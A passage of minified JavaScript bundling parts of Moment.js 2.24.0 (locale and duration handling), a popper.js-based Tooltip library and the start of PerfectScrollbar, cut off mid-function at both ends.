e = {}; return y(e, this), (e = xe(e))._a ? (t = (e._isUTC ? A : Qe)(e._a), this._isDSTShifted = this.isValid() && 0 < s(e._a, t.toArray())) : this._isDSTShifted = !1, this._isDSTShifted }); var dn = S.prototype; function Cn(t, e, n, i) { var o = le(), a = A().set(i, e); return o[n](a, t) } function An(t, e, n) { if (u(t) && (e = t, t = void 0), t = t || "", null != e) return Cn(t, e, n, "month"); for (var i = [], o = 0; o < 12; o++)i[o] = Cn(t, o, n, "month"); return i } function pn(t, e, n, i) { "boolean" == typeof t ? u(e) && (n = e, e = void 0) : (e = t, t = !1, u(n = e) && (n = e, e = void 0)), e = e || ""; var o = le(), a = t ? o._week.dow : 0; if (null != n) return Cn(e, (n + a) % 7, i, "day"); for (var s = [], r = 0; r < 7; r++)s[r] = Cn(e, (r + a) % 7, i, "day"); return s } dn.calendar = function (t, e, n) { var i = this._calendar[t] || this._calendar.sameElse; return w(i) ? i.call(e, n) : i }, dn.longDateFormat = function (t) { var e = this._longDateFormat[t], n = this._longDateFormat[t.toUpperCase()]; return e || !n ? e : (this._longDateFormat[t] = n.replace(/MMMM|MM|DD|dddd/g, function (t) { return t.slice(1) }), this._longDateFormat[t]) }, dn.invalidDate = function () { return this._invalidDate }, dn.ordinal = function (t) { return this._ordinal.replace("%d", t) }, dn.preparse = hn, dn.postformat = hn, dn.relativeTime = function (t, e, n, i) { var o = this._relativeTime[n]; return w(o) ? o(t, e, n, i) : o.replace(/%d/i, t) }, dn.pastFuture = function (t, e) { var n = this._relativeTime[0 < t ? "future" : "past"]; return w(n) ? n(e) : n.replace(/%s/i, e) }, dn.set = function (t) { var e, n; for (n in t) w(e = t[n]) ? this[n] = e : this["_" + n] = e; this._config = t, this._dayOfMonthOrdinalParseLenient = new RegExp((this._dayOfMonthOrdinalParse.source || this._ordinalParse.source) + "|" + /\d{1,2}/.source) }, dn.months = function (t, e) { return t ? l(this._months) ? this._months[t.month()] : this._months[(this._months.isFormat || St).test(e) ? "format" : "standalone"][t.month()] : l(this._months) ? this._months : this._months.standalone }, dn.monthsShort = function (t, e) { return t ? l(this._monthsShort) ? this._monthsShort[t.month()] : this._monthsShort[St.test(e) ? "format" : "standalone"][t.month()] : l(this._monthsShort) ? this._monthsShort : this._monthsShort.standalone }, dn.monthsParse = function (t, e, n) { var i, o, a; if (this._monthsParseExact) return function (t, e, n) { var i, o, a, s = t.toLocaleLowerCase(); if (!this._monthsParse) for (this._monthsParse = [], this._longMonthsParse = [], this._shortMonthsParse = [], i = 0; i < 12; ++i)a = A([2e3, i]), this._shortMonthsParse[i] = this.monthsShort(a, "").toLocaleLowerCase(), this._longMonthsParse[i] = this.months(a, "").toLocaleLowerCase(); return n ? "MMM" === e ? -1 !== (o = xt.call(this._shortMonthsParse, s)) ? o : null : -1 !== (o = xt.call(this._longMonthsParse, s)) ? o : null : "MMM" === e ? -1 !== (o = xt.call(this._shortMonthsParse, s)) || -1 !== (o = xt.call(this._longMonthsParse, s)) ? o : null : -1 !== (o = xt.call(this._longMonthsParse, s)) || -1 !== (o = xt.call(this._shortMonthsParse, s)) ? o : null }.call(this, t, e, n); for (this._monthsParse || (this._monthsParse = [], this._longMonthsParse = [], this._shortMonthsParse = []), i = 0; i < 12; i++) { if (o = A([2e3, i]), n && !this._longMonthsParse[i] && (this._longMonthsParse[i] = new RegExp("^" + this.months(o, "").replace(".", "") + "$", "i"), this._shortMonthsParse[i] = new RegExp("^" + this.monthsShort(o, "").replace(".", "") + "$", "i")), n || this._monthsParse[i] || (a = "^" + this.months(o, "") + "|^" + this.monthsShort(o, ""), this._monthsParse[i] = new RegExp(a.replace(".", ""), "i")), n && "MMMM" === e && this._longMonthsParse[i].test(t)) return i; if (n && "MMM" === e && this._shortMonthsParse[i].test(t)) return i; if (!n && this._monthsParse[i].test(t)) return i } }, dn.monthsRegex = function (t) { return this._monthsParseExact ? (m(this, "_monthsRegex") || Tt.call(this), t ? this._monthsStrictRegex : this._monthsRegex) : (m(this, "_monthsRegex") || (this._monthsRegex = Nt), this._monthsStrictRegex && t ? this._monthsStrictRegex : this._monthsRegex) }, dn.monthsShortRegex = function (t) { return this._monthsParseExact ? (m(this, "_monthsRegex") || Tt.call(this), t ? this._monthsShortStrictRegex : this._monthsShortRegex) : (m(this, "_monthsShortRegex") || (this._monthsShortRegex = Wt), this._monthsShortStrictRegex && t ? this._monthsShortStrictRegex : this._monthsShortRegex) }, dn.week = function (t) { return Yt(t, this._week.dow, this._week.doy).week }, dn.firstDayOfYear = function () { return this._week.doy }, dn.firstDayOfWeek = function () { return this._week.dow }, dn.weekdays = function (t, e) { var n = l(this._weekdays) ? this._weekdays : this._weekdays[t && !0 !== t && this._weekdays.isFormat.test(e) ? "format" : "standalone"]; return !0 === t ? _t(n, this._week.dow) : t ? n[t.day()] : n }, dn.weekdaysMin = function (t) { return !0 === t ? _t(this._weekdaysMin, this._week.dow) : t ? this._weekdaysMin[t.day()] : this._weekdaysMin }, dn.weekdaysShort = function (t) { return !0 === t ? _t(this._weekdaysShort, this._week.dow) : t ? this._weekdaysShort[t.day()] : this._weekdaysShort }, dn.weekdaysParse = function (t, e, n) { var i, o, a; if (this._weekdaysParseExact) return function (t, e, n) { var i, o, a, s = t.toLocaleLowerCase(); if (!this._weekdaysParse) for (this._weekdaysParse = [], this._shortWeekdaysParse = [], this._minWeekdaysParse = [], i = 0; i < 7; ++i)a = A([2e3, 1]).day(i), this._minWeekdaysParse[i] = this.weekdaysMin(a, "").toLocaleLowerCase(), this._shortWeekdaysParse[i] = this.weekdaysShort(a, "").toLocaleLowerCase(), this._weekdaysParse[i] = this.weekdays(a, "").toLocaleLowerCase(); return n ? "dddd" === e ? -1 !== (o = xt.call(this._weekdaysParse, s)) ? o : null : "ddd" === e ? -1 !== (o = xt.call(this._shortWeekdaysParse, s)) ? o : null : -1 !== (o = xt.call(this._minWeekdaysParse, s)) ? o : null : "dddd" === e ? -1 !== (o = xt.call(this._weekdaysParse, s)) || -1 !== (o = xt.call(this._shortWeekdaysParse, s)) || -1 !== (o = xt.call(this._minWeekdaysParse, s)) ? o : null : "ddd" === e ? -1 !== (o = xt.call(this._shortWeekdaysParse, s)) || -1 !== (o = xt.call(this._weekdaysParse, s)) || -1 !== (o = xt.call(this._minWeekdaysParse, s)) ? o : null : -1 !== (o = xt.call(this._minWeekdaysParse, s)) || -1 !== (o = xt.call(this._weekdaysParse, s)) || -1 !== (o = xt.call(this._shortWeekdaysParse, s)) ? o : null }.call(this, t, e, n); for (this._weekdaysParse || (this._weekdaysParse = [], this._minWeekdaysParse = [], this._shortWeekdaysParse = [], this._fullWeekdaysParse = []), i = 0; i < 7; i++) { if (o = A([2e3, 1]).day(i), n && !this._fullWeekdaysParse[i] && (this._fullWeekdaysParse[i] = new RegExp("^" + this.weekdays(o, "").replace(".", "\\.?") + "$", "i"), this._shortWeekdaysParse[i] = new RegExp("^" + this.weekdaysShort(o, "").replace(".", "\\.?") + "$", "i"), this._minWeekdaysParse[i] = new RegExp("^" + this.weekdaysMin(o, "").replace(".", "\\.?") + "$", "i")), this._weekdaysParse[i] || (a = "^" + this.weekdays(o, "") + "|^" + this.weekdaysShort(o, "") + "|^" + this.weekdaysMin(o, ""), this._weekdaysParse[i] = new RegExp(a.replace(".", ""), "i")), n && "dddd" === e && this._fullWeekdaysParse[i].test(t)) return i; if (n && "ddd" === e && this._shortWeekdaysParse[i].test(t)) return i; if (n && "dd" === e && this._minWeekdaysParse[i].test(t)) return i; if (!n && this._weekdaysParse[i].test(t)) return i } }, dn.weekdaysRegex = function (t) { return this._weekdaysParseExact ? (m(this, "_weekdaysRegex") || Jt.call(this), t ? this._weekdaysStrictRegex : this._weekdaysRegex) : (m(this, "_weekdaysRegex") || (this._weekdaysRegex = zt), this._weekdaysStrictRegex && t ? this._weekdaysStrictRegex : this._weekdaysRegex) }, dn.weekdaysShortRegex = function (t) { return this._weekdaysParseExact ? (m(this, "_weekdaysRegex") || Jt.call(this), t ? this._weekdaysShortStrictRegex : this._weekdaysShortRegex) : (m(this, "_weekdaysShortRegex") || (this._weekdaysShortRegex = Pt), this._weekdaysShortStrictRegex && t ? this._weekdaysShortStrictRegex : this._weekdaysShortRegex) }, dn.weekdaysMinRegex = function (t) { return this._weekdaysParseExact ? (m(this, "_weekdaysRegex") || Jt.call(this), t ? this._weekdaysMinStrictRegex : this._weekdaysMinRegex) : (m(this, "_weekdaysMinRegex") || (this._weekdaysMinRegex = Kt), this._weekdaysMinStrictRegex && t ? this._weekdaysMinStrictRegex : this._weekdaysMinRegex) }, dn.isPM = function (t) { return "p" === (t + "").toLowerCase().charAt(0) }, dn.meridiem = function (t, e, n) { return 11 < t ? n ? "pm" : "PM" : n ? "am" : "AM" }, re("en", { dayOfMonthOrdinalParse: /\d{1,2}(th|st|nd|rd)/, ordinal: function (t) { var e = t % 10; return t + (1 === Q(t % 100 / 10) ? "th" : 1 == e ? "st" : 2 == e ? "nd" : 3 == e ? "rd" : "th") } }), f.lang = n("moment.lang is deprecated. Use moment.locale instead.", re), f.langData = n("moment.langData is deprecated. Use moment.localeData instead.", le); var mn = Math.abs; function fn(t, e, n, i) { var o = Oe(e, n); return t._milliseconds += i * o._milliseconds, t._days += i * o._days, t._months += i * o._months, t._bubble() } function bn(t) { return t < 0 ? Math.floor(t) : Math.ceil(t) } function Bn(t) { return 4800 * t / 146097 } function yn(t) { return 146097 * t / 4800 } function vn(t) { return function () { return this.as(t) } } var xn = vn("ms"), Fn = vn("s"), Qn = vn("m"), Gn = vn("h"), wn = vn("d"), Xn = vn("w"), Sn = vn("M"), kn = vn("Q"), Dn = vn("y"); function Zn(t) { return function () { return this.isValid() ? this._data[t] : NaN } } var Un = Zn("milliseconds"), Wn = Zn("seconds"), Nn = Zn("minutes"), Tn = Zn("hours"), Hn = Zn("days"), En = Zn("months"), Rn = Zn("years"), Yn = Math.round, On = { ss: 44, s: 45, m: 45, h: 22, d: 26, M: 11 }, _n = Math.abs; function Vn(t) { return (0 < t) - (t < 0) || +t } function Ln() { if (!this.isValid()) return this.localeData().invalidDate(); var t, e = _n(this._milliseconds) / 1e3, n = _n(this._days), i = _n(this._months), o = F((t = F(e / 60)) / 60); e %= 60, t %= 60; var a = F(i / 12), s = i %= 12, r = n, g = o, l = t, c = e ? e.toFixed(3).replace(/\.?0+$/, "") : "", I = this.asSeconds(); if (!I) return "P0D"; var u = I < 0 ? "-" : "", h = Vn(this._months) !== Vn(I) ? "-" : "", d = Vn(this._days) !== Vn(I) ? "-" : "", C = Vn(this._milliseconds) !== Vn(I) ? "-" : ""; return u + "P" + (a ? h + a + "Y" : "") + (s ? h + s + "M" : "") + (r ? d + r + "D" : "") + (g || l || c ? "T" : "") + (g ? C + g + "H" : "") + (l ? C + l + "M" : "") + (c ? C + c + "S" : "") } var Mn = ke.prototype; return Mn.isValid = function () { return this._isValid }, Mn.abs = function () { var t = this._data; return this._milliseconds = mn(this._milliseconds), this._days = mn(this._days), this._months = mn(this._months), t.milliseconds = mn(t.milliseconds), t.seconds = mn(t.seconds), t.minutes = mn(t.minutes), t.hours = mn(t.hours), t.months = mn(t.months), t.years = mn(t.years), this }, Mn.add = function (t, e) { return fn(this, t, e, 1) }, Mn.subtract = function (t, e) { return fn(this, t, e, -1) }, Mn.as = function (t) { if (!this.isValid()) return NaN; var e, n, i = this._milliseconds; if ("month" === (t = Z(t)) || "quarter" === t || "year" === t) switch (e = this._days + i / 864e5, n = this._months + Bn(e), t) { case "month": return n; case "quarter": return n / 3; case "year": return n / 12 } else switch (e = this._days + Math.round(yn(this._months)), t) { case "week": return e / 7 + i / 6048e5; case "day": return e + i / 864e5; case "hour": return 24 * e + i / 36e5; case "minute": return 1440 * e + i / 6e4; case "second": return 86400 * e + i / 1e3; case "millisecond": return Math.floor(864e5 * e) + i; default: throw new Error("Unknown unit " + t) } }, Mn.asMilliseconds = xn, Mn.asSeconds = Fn, Mn.asMinutes = Qn, Mn.asHours = Gn, Mn.asDays = wn, Mn.asWeeks = Xn, Mn.asMonths = Sn, Mn.asQuarters = kn, Mn.asYears = Dn, Mn.valueOf = function () { return this.isValid() ? this._milliseconds + 864e5 * this._days + this._months % 12 * 2592e6 + 31536e6 * Q(this._months / 12) : NaN }, Mn._bubble = function () { var t, e, n, i, o, a = this._milliseconds, s = this._days, r = this._months, g = this._data; return 0 <= a && 0 <= s && 0 <= r || a <= 0 && s <= 0 && r <= 0 || (a += 864e5 * bn(yn(r) + s), r = s = 0), g.milliseconds = a % 1e3, t = F(a / 1e3), g.seconds = t % 60, e = F(t / 60), g.minutes = e % 60, n = F(e / 60), g.hours = n % 24, r += o = F(Bn(s += F(n / 24))), s -= bn(yn(o)), i = F(r / 12), r %= 12, g.days = s, g.months = r, g.years = i, this }, Mn.clone = function () { return Oe(this) }, Mn.get = function (t) { return t = Z(t), this.isValid() ? this[t + "s"]() : NaN }, Mn.milliseconds = Un, Mn.seconds = Wn, Mn.minutes = Nn, Mn.hours = Tn, Mn.days = Hn, Mn.weeks = function () { return F(this.days() / 7) }, Mn.months = En, Mn.years = Rn, Mn.humanize = function (t) { if (!this.isValid()) return this.localeData().invalidDate(); var e, n, i, o, a, s, r, g, l, c, I = this.localeData(), u = (e = !t, n = I, i = Oe(this).abs(), o = Yn(i.as("s")), a = Yn(i.as("m")), s = Yn(i.as("h")), r = Yn(i.as("d")), g = Yn(i.as("M")), l = Yn(i.as("y")), (c = (o <= On.ss ? ["s", o] : o < On.s && ["ss", o]) || a <= 1 && ["m"] || a < On.m && ["mm", a] || s <= 1 && ["h"] || s < On.h && ["hh", s] || r <= 1 && ["d"] || r < On.d && ["dd", r] || g <= 1 && ["M"] || g < On.M && ["MM", g] || l <= 1 && ["y"] || ["yy", l])[2] = e, c[3] = 0 < +this, c[4] = n, function (t, e, n, i, o) { return o.relativeTime(e || 1, !!n, t, i) }.apply(null, c)); return t && (u = I.pastFuture(+this, u)), I.postformat(u) }, Mn.toISOString = Ln, Mn.toString = Ln, Mn.toJSON = Ln, Mn.locale = Je, Mn.localeData = $e, Mn.toIsoString = n("toIsoString() is deprecated. Please use toISOString() instead (notice the capitals)", Ln), Mn.lang = je, O("X", 0, 0, "unix"), O("x", 0, 0, "valueOf"), gt("x", it), gt("X", /[+-]?\d+(\.\d{1,3})?/), It("X", function (t, e, n) { n._d = new Date(1e3 * parseFloat(t, 10)) }), It("x", function (t, e, n) { n._d = new Date(Q(t)) }), f.version = "2.24.0", t = Qe, f.fn = un, f.min = function () { return Xe("isBefore", [].slice.call(arguments, 0)) }, f.max = function () { return Xe("isAfter", [].slice.call(arguments, 0)) }, f.now = function () { return Date.now ? Date.now() : +new Date }, f.utc = A, f.unix = function (t) { return Qe(1e3 * t) }, f.months = function (t, e) { return An(t, e, "months") }, f.isDate = h, f.locale = re, f.invalid = B, f.duration = Oe, f.isMoment = x, f.weekdays = function (t, e, n) { return pn(t, e, n, "weekdays") }, f.parseZone = function () { return Qe.apply(null, arguments).parseZone() }, f.localeData = le, f.isDuration = De, f.monthsShort = function (t, e) { return An(t, e, "monthsShort") }, f.weekdaysMin = function (t, e, n) { return pn(t, e, n, "weekdaysMin") }, f.defineLocale = ge, f.updateLocale = function (t, e) { var n, i, o; return null != e ? (o = ne, null != (i = se(t)) && (o = i._config), (n = new S(e = X(o, e))).parentLocale = ie[t], ie[t] = n, re(t)) : null != ie[t] && (null != ie[t].parentLocale ? ie[t] = ie[t].parentLocale : null != ie[t] && delete ie[t]), ie[t] }, f.locales = function () { return i(ie) }, f.weekdaysShort = function (t, e, n) { return pn(t, e, n, "weekdaysShort") }, f.normalizeUnits = Z, f.relativeTimeRounding = function (t) { return void 0 === t ? Yn : "function" == typeof t && (Yn = t, !0) }, f.relativeTimeThreshold = function (t, e) { return void 0 !== On[t] && (void 0 === e ? On[t] : (On[t] = e, "s" === t && (On.ss = e - 1), !0)) }, f.calendarFormat = function (t, e) { var n = t.diff(e, "days", !0); return n < -6 ? "sameElse" : n < -1 ? "lastWeek" : n < 0 ? "lastDay" : n < 1 ? "sameDay" : n < 2 ? "nextDay" : n < 7 ? "nextWeek" : "sameElse" }, f.prototype = un, f.HTML5_FMT = { DATETIME_LOCAL: "YYYY-MM-DDTHH:mm", DATETIME_LOCAL_SECONDS: "YYYY-MM-DDTHH:mm:ss", DATETIME_LOCAL_MS: "YYYY-MM-DDTHH:mm:ss.SSS", DATE: "YYYY-MM-DD", TIME: "HH:mm", TIME_SECONDS: "HH:mm:ss", TIME_MS: "HH:mm:ss.SSS", WEEK: "GGGG-[W]WW", MONTH: "YYYY-MM" }, f }), function (t, e) { "object" == typeof exports && "undefined" != typeof module ? module.exports = e(require("popper.js")) : "function" == typeof define && define.amd ? define(["popper.js"], e) : t.Tooltip = e(t.Popper) }(this, function (a) { "use strict"; a = a && a.hasOwnProperty("default") ? a.default : a; var i = function (t, e) { if (!(t instanceof e)) throw new TypeError("Cannot call a class as a function") }, t = function (t, e, n) { return e && l(t.prototype, e), n && l(t, n), t }, s = Object.assign || function (t) { for (var e, n = 1; n < arguments.length; n++)for (var i in e = arguments[n]) Object.prototype.hasOwnProperty.call(e, i) && (t[i] = e[i]); return t }, o = { container: !1, delay: 0, html: !1, placement: "top", title: "", template: '<div class="tooltip" role="tooltip"><div class="tooltip-arrow"></div><div class="tooltip-inner"></div></div>', trigger: "hover focus", offset: 0, arrowSelector: ".tooltip-arrow, .tooltip__arrow", innerSelector: ".tooltip-inner, .tooltip__inner" }, e = (t(g, [{ key: "_create", value: function (t, e, n, i) { var o = window.document.createElement("div"); o.innerHTML = e.trim(); var a = o.childNodes[0]; a.id = "tooltip_" + Math.random().toString(36).substr(2, 10), a.setAttribute("aria-hidden", "false"); var s = o.querySelector(this.options.innerSelector); return this._addTitleContent(t, n, i, s), a } }, { key: "_addTitleContent", value: function (t, e, n, i) { var o, a; 1 === e.nodeType || 11 === e.nodeType ? n && i.appendChild(e) : (a = e) && "[object Function]" === {}.toString.call(a) ? (o = e.call(t), n ? i.innerHTML = o : i.textContent = o) : n ? i.innerHTML = e : i.textContent = e } }, { key: "_show", value: function (t, e) { if (this._isOpen && !this._isOpening) return this; if (this._isOpen = !0, this._tooltipNode) return this._tooltipNode.style.visibility = "visible", this._tooltipNode.setAttribute("aria-hidden", "false"), this.popperInstance.update(), this; var n = t.getAttribute("title") || e.title; if (!n) return this; var i = this._create(t, e.template, n, e.html); t.setAttribute("aria-describedby", i.id); var o = this._findContainer(e.container, t); return this._append(i, o), this._popperOptions = s({}, e.popperOptions, { placement: e.placement }), this._popperOptions.modifiers = s({}, this._popperOptions.modifiers, { arrow: s({}, this._popperOptions.modifiers && this._popperOptions.modifiers.arrow, { element: e.arrowSelector }), offset: s({}, this._popperOptions.modifiers && this._popperOptions.modifiers.offset, { offset: e.offset }) }), e.boundariesElement && (this._popperOptions.modifiers.preventOverflow = { boundariesElement: e.boundariesElement }), this.popperInstance = new a(t, i, this._popperOptions), this._tooltipNode = i, this } }, { key: "_hide", value: function () { return this._isOpen && (this._isOpen = !1, this._tooltipNode.style.visibility = "hidden", this._tooltipNode.setAttribute("aria-hidden", "true")), this } }, { key: "_dispose", value: function () { var i = this; return this._events.forEach(function (t) { var e = t.func, n = t.event; i.reference.removeEventListener(n, e) }), this._events = [], this._tooltipNode && (this._hide(), this.popperInstance.destroy(), this.popperInstance.options.removeOnDestroy || (this._tooltipNode.parentNode.removeChild(this._tooltipNode), this._tooltipNode = null)), this } }, { key: "_findContainer", value: function (t, e) { return "string" == typeof t ? t = window.document.querySelector(t) : !1 === t && (t = e.parentNode), t } }, { key: "_append", value: function (t, e) { e.appendChild(t) } }, { key: "_setEventListeners", value: function (i, t, o) { var a = this, e = [], n = []; t.forEach(function (t) { "hover" === t ? (e.push("mouseenter"), n.push("mouseleave")) : "focus" === t ? (e.push("focus"), n.push("blur")) : "click" === t && (e.push("click"), n.push("click")) }), e.forEach(function (t) { function e(t) { !0 === a._isOpening || (t.usedByTooltip = !0, a._scheduleShow(i, o.delay, o, t)) } a._events.push({ event: t, func: e }), i.addEventListener(t, e) }), n.forEach(function (t) { function n(t) { !0 === t.usedByTooltip || a._scheduleHide(i, o.delay, o, t) } a._events.push({ event: t, func: n }), i.addEventListener(t, n), "click" === t && o.closeOnClickOutside && document.addEventListener("mousedown", function (t) { var e; a._isOpening && (e = a.popperInstance.popper, i.contains(t.target) || e.contains(t.target) || n(t)) }, !0) }) } }, { key: "_scheduleShow", value: function (t, e, n) { var i = this; this._isOpening = !0; var o = e && e.show || e || 0; this._showTimeout = window.setTimeout(function () { return i._show(t, n) }, o) } }, { key: "_scheduleHide", value: function (t, e, n, i) { var o = this; this._isOpening = !1; var a = e && e.hide || e || 0; window.clearTimeout(this._showTimeout), window.setTimeout(function () { if (!1 !== o._isOpen && document.body.contains(o._tooltipNode)) { if ("mouseleave" === i.type && o._setTooltipNodeEvent(i, t, e, n)) return; o._hide(t, n) } }, a) } }, { key: "_updateTitleContent", value: function (t) { var e; void 0 !== this._tooltipNode ? (e = this._tooltipNode.querySelector(this.options.innerSelector), this._clearTitleContent(e, this.options.html, this.reference.getAttribute("title") || this.options.title), this._addTitleContent(this.reference, t, this.options.html, e), this.options.title = t, this.popperInstance.update()) : void 0 !== this.options.title && (this.options.title = t) } }, { key: "_clearTitleContent", value: function (t, e, n) { 1 === n.nodeType || 11 === n.nodeType ? e && t.removeChild(n) : e ? t.innerHTML = "" : t.textContent = "" } }]), g), r = function () { var s = this; this.show = function () { return s._show(s.reference, s.options) }, this.hide = function () { return s._hide() }, this.dispose = function () { return s._dispose() }, this.toggle = function () { return s._isOpen ? s.hide() : s.show() }, this.updateTitleContent = function (t) { return s._updateTitleContent(t) }, this._events = [], this._setTooltipNodeEvent = function (i, o, t, a) { var e = i.relatedreference || i.toElement || i.relatedTarget; return !!s._tooltipNode.contains(e) && (s._tooltipNode.addEventListener(i.type, function t(e) { var n = e.relatedreference || e.toElement || e.relatedTarget; s._tooltipNode.removeEventListener(i.type, t), o.contains(n) || s._scheduleHide(o, a.delay, a, e) }), !0) } }; function g(t, e) { i(this, g), r.call(this), e = s({}, o, e), t.jquery && (t = t[0]), this.reference = t; var n = "string" == typeof (this.options = e).trigger ? e.trigger.split(" ").filter(function (t) { return -1 !== ["click", "hover", "focus"].indexOf(t) }) : []; this._isOpen = !1, this._popperOptions = {}, this._setEventListeners(t, n, e) } function l(t, e) { for (var n, i = 0; i < e.length; i++)(n = e[i]).enumerable = n.enumerable || !1, n.configurable = !0, "value" in n && (n.writable = !0), Object.defineProperty(t, n.key, n) } return e }), function (t, e) { "object" == typeof exports && "undefined" != typeof module ? module.exports = e() : "function" == typeof define && define.amd ? define(e) : t.PerfectScrollbar = e() }(this, function () { "use strict"; function p(t) { return getComputedStyle(t) } function u(t, e) { for (var n in e) { var i = e[n]; "number" == typeof i && (i += "px"), t.style[n] = i } return t } function h(t) { var e = document.createElement("div"); return e.className = t, e } var n = "undefined" != typeof Element && (Element.prototype.matches || Element.prototype.webkitMatchesSelector || Element.prototype.mozMatchesSelector || Element.prototype.msMatchesSelector); function r(t, e) { if (!n) throw new Error("No element matching method supported"); return n.call(t, e) } function i(t) { t.remove ? t.remove() : t.parentNode && t.parentNode.removeChild(t) } function o(t, e) { return Array.prototype.filter.call(t.children, function (t) { return r(t, e) }) } var m = { main: "ps", element: { thumb: function (t) { return "ps__thumb-" + t }, rail: function (t) { return "ps__rail-" + t }, consuming: "ps__child--consume" }, state: { focus: "ps--focus", clicking: "ps--clicking", active: function (t) { return "ps--active-" + t }, scrolling: function (t) { return "ps--scrolling-" + t } } }, a = { x: null, y: null }; function f(t, e) { var n = t.element.classList, i = m.state.scrolling(e); n.contains(i) ? clearTimeout(a[e]) : n.add(i) } function b(t, e) { a[e] = setTimeout(function () { return t.isAlive && t.element.classList.remove(m.state.scrolling(e)) }, t.settings.scrollingThreshold) } function s(t) { this.element = t, this.handlers = {} } var t = { isEmpty: { configurable: !0 } }; s.prototype.bind = function (t, e) { void 0 === this.handlers[t] && (this.handlers[t] = []), this.handlers[t].push(e), this.element.addEventListener(t, e, !1) }, s.prototype.unbind = function (e, n) { var i = this; this.handlers[e] = this.handlers[e].filter(function (t) { return !(!n || t === n) || (i.element.removeEventListener(e, t, !1), !1) }) }, s.prototype.unbindAll = function () { for (var t in this.handlers) this.unbind(t) }, t.isEmpty.get = function () { var e = this; return Object.keys(this.handlers).every(function (t) { return 0 === e.handlers[t].length }) }, Object.defineProperties(s.prototype, t); function d() { this.eventElements = [] } function C(t) { if ("function" == typeof window.CustomEvent) return new CustomEvent(t); var e = document.createEvent("CustomEvent"); return e.initCustomEvent(t, !1, !1, void 0), e } d.prototype.eventElement = function (e) { var t = this.eventElements.filter(function (t) { return t.element === e })[0]; return t || (t = new s(e), this.eventElements.push(t)), t }, d.prototype.bind = function (t, e, n) { this.eventElement(t).bind(e, n) }, d.prototype.unbind = function (t, e, n) { var i = this.eventElement(t); i.unbind(e, n), i.isEmpty && this.eventElements.splice(this.eventElements.indexOf(i), 1) }, d.prototype.unbindAll = function () { this.eventElements.forEach(function (t) { return t.unbindAll() }), this.eventElements = [] }, d.prototype.once = function (t, e, n) { var i = this.eventElement(t), o = function (t) { i.unbind(e, o), n(t) }; i.bind(e, o) }; function e(t, e, n, i, o) { var a; if (void 0 === i && (i = !0), void 0 === o && (o = !1), "top" === e) a = ["contentHeight", "containerHeight", "scrollTop", "y", "up", "down"]; else { if ("left" !== e) throw new Error("A proper axis should be provided"); a = ["contentWidth", "containerWidth", "scrollLeft", "x", "left", "right"] } !function (t, e, n, i, o) { var a = n[0], s = n[1], r = n[2], g = n[3], l = n[4], c = n[5]; void 0 === i && (i = !0); void 0 === o && (o = !1); var I = t.element; t.reach[g] = null, I[r] < 1 && (t.reach[g] = "start"); I[r] > t[a] - t[s] - 1 && (t.reach[g] = "end"); e && (I.dispatchEvent(C("ps-scroll-" + g)), e < 0 ? I.dispatchEvent(C("ps-scroll-" + l)) : 0 < e && I.dispatchEvent(C("ps-scroll-" + c)), i && function (t, e) { f(t, e), b(t, e) }(t, g)); t.reach[g] && (e || o) && I.dispatchEvent(C("ps-" + g + "-reach-" + t.reach[g])) }(t, n, a, i, o) } function A(t) { return parseInt(t, 10) || 0 } function B(t) { var e = t.element, n = Math.floor(e.scrollTop); t.containerWidth = e.clientWidth, t.containerHeight = e.clientHeight, t.contentWidth = e.scrollWidth, t.contentHeight = e.scrollHeight, e.contains(t.scrollbarXRail) || (o(e, m.element.rail("x")).forEach(i), e.appendChild(t.scrollbarXRail)), e.contains(t.scrollbarYRail) || (o(e, m.element.rail("y")).forEach(i), e.appendChild(t.scrollbarYRail)), !t.settings.suppressScrollX && t.containerWidth + t.settings.scrollXMarginOffset < t.contentWidth ? (t.scrollbarXActive = !0, t.railXWidth = t.containerWidth - t.railXMarginWidth, t.railXRatio = t.containerWidth / t.railXWidth, t.scrollbarXWidth = g(t, A(t.railXWidth * t.containerWidth / t.contentWidth)), t.scrollbarXLeft = A((t.negativeScrollAdjustment + e.scrollLeft) * (t.railXWidth - t.scrollbarXWidth) / (t.contentWidth - t.containerWidth))) : t.scrollbarXActive = !1, !t.settings.suppressScrollY && t.containerHeight + t.settings.scrollYMarginOffset < t.contentHeight ? (t.scrollbarYActive = !0, t.railYHeight = t.containerHeight - t.railYMarginHeight, t.railYRatio = t.containerHeight / t.railYHeight, t.scrollbarYHeight = g(t, A(t.railYHeight * t.containerHeight / t.contentHeight)), t.scrollbarYTop = A(n * (t.railYHeight - t.scrollbarYHeight) / (t.contentHeight - t.containerHeight))) : t.scrollbarYActive = !1, t.scrollbarXLeft >= t.railXWidth - t.scrollbarXWidth && (t.scrollbarXLeft = t.railXWidth - t.scrollbarXWidth), t.scrollbarYTop >= t.railYHeight - t.scrollbarYHeight && (t.scrollbarYTop = t.railYHeight - t.scrollbarYHeight), function (t, e) { var n = { width: e.railXWidth }, i = Math.floor(t.scrollTop); e.isRtl ? n.left = e.negativeScrollAdjustment + t.scrollLeft + e.containerWidth - e.contentWidth : n.left = t.scrollLeft; e.isScrollbarXUsingBottom ? n.bottom = e.scrollbarXBottom - i : n.top = e.scrollbarXTop + i; u(e.scrollbarXRail, n); var o = { top: i, height: e.railYHeight }; e.isScrollbarYUsingRight ? e.isRtl ? o.right = e.contentWidth - (e.negativeScrollAdjustment + t.scrollLeft) - e.scrollbarYRight - e.scrollbarYOuterWidth : o.right = e.scrollbarYRight - t.scrollLeft : e.isRtl ? o.left = e.negativeScrollAdjustment + t.scrollLeft + 2 * e.containerWidth - e.contentWidth - e.scrollbarYLeft - e.scrollbarYOuterWidth : o.left = e.scrollbarYLeft + t.scrollLeft; u(e.scrollbarYRail, o), u(e.scrollbarX, { left: e.scrollbarXLeft, width: e.scrollbarXWidth - e.railBorderXWidth }), u(e.scrollbarY, { top: e.scrollbarYTop, height: e.scrollbarYHeight - e.railBorderYWidth }) }(e, t), t.scrollbarXActive ? e.classList.add(m.state.active("x")) : (e.classList.remove(m.state.active("x")), t.scrollbarXWidth = 0, t.scrollbarXLeft = 0, e.scrollLeft = 0), t.scrollbarYActive ? e.classList.add(m.state.active("y")) : (e.classList.remove(m.state.active("y")), t.scrollbarYHeight = 0, t.scrollbarYTop = 0, e.scrollTop = 0) } var y = { isWebKit: "undefined" != typeof document && "WebkitAppearance" in document.documentElement.style, supportsTouch: "undefined" != typeof window && ("ontouchstart" in window || window.DocumentTouch && document instanceof window.DocumentTouch), supportsIePointer: "undefined" != typeof navigator && navigator.msMaxTouchPoints, isChrome: "undefined" != typeof navigator && /Chrome/i.test(navigator && navigator.userAgent) }; function g(t, e) { return t.settings.minScrollbarLength && (e = Math.max(e, 